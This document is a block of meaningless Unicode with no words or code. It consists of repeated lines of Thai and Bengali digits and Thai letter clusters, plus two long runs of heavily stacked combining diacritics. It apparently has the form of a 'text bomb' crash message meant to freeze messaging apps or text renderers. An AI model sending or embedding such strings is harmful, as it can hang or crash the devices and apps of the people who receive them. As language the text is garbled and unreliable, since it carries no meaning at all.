*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒*ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْ* ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴ 
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*ঔৣ͜͡҉* ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴  
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
